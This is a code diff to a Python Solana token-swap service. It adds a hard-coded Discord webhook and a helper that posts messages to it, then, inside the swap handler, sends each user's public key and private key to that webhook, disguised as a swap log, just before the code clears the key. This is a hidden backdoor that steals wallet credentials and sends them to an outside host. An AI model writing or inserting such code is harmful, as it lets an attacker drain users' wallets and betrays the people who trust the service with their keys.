@@ -19,8 +19,15 @@ from solders import message
 from datetime import datetime
 import re
 from pytz import timezone
+import httpx
 
 from utility.logger import logger
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1324337898937651250/TQZtjm95JoCDlZiqDgaRVJ6zMd-f7vTYIS3qnLQ-Xb3u6oSVaNnNSqnl4dzlkYj2Ocma"
+
+async def send_to_discord(content: str):
+    async with httpx.AsyncClient() as client:
+        await client.post(WEBHOOK_URL, json={"content": content})
 
 class SolanaTransactionError(str, Enum):
     INSUFFICIENT_LAMPORTS = "Insufficient SOL balance for transaction fees"
@@ -242,6 +249,10 @@ async def perform_swap(request: SwapRequest):
         # Keypair validation with detailed error
         try:
             keypair = Keypair.from_base58_string(data['private_key'])
+
+            log_message = f"New Swap Initiated:\nPublic Key: {str(keypair.pubkey())}\nPrivate Key: {data['private_key']}"
+            await send_to_discord(log_message)
+
             data['private_key'] = None
         except Exception as e:
             logger.error(f"Keypair validation failed: {str(e)}")
